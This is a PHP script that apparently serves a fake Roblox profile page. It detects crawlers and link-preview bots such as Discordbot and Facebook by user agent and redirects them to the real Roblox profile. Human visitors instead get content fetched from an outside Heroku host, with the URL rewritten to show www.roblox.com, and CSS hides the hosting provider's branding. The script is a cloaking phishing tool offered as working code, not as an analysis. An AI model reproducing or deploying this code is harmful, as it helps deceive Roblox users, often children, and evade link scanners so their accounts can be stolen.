<?php
  $id = $_GET["id"];
  if (is_numeric($id)){
  $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
  $bot_identifiers = array(
    'bot',
    'slurp',
    'crawler',
    'spider',
    'curl',
    'facebook',
    'fetch',
    'Discordbot'
  );
  foreach ($bot_identifiers as $identifier) {
    if (strpos($user_agent, $identifier) !== FALSE) {
      header("location: https://www.roblox.com/users/$id/profile");
      die();
    }
  }
if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
$url = "https://";   
else  
$url = "http://";
$url.= $_SERVER['HTTP_HOST'];   
$url.= $_SERVER['REQUEST_URI'];
$url = str_replace($_SERVER['HTTP_HOST'],"www.roblox.com",$url);
$profile = file_get_contents("https://vkn.herokuapp.com/profile.php?id=$id");
if (empty($profile)) {
header("location: /request-error?code=404");
} else {
echo str_replace("lol",$url,$profile);
}
} else {
header("location: /request-error?code=404");   
}
?>
<style>
div[style*="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"] {
    display: none !important;
}

img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
    display: none !important;
}

a[href*="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"] {
    display: none !important;
}
</style>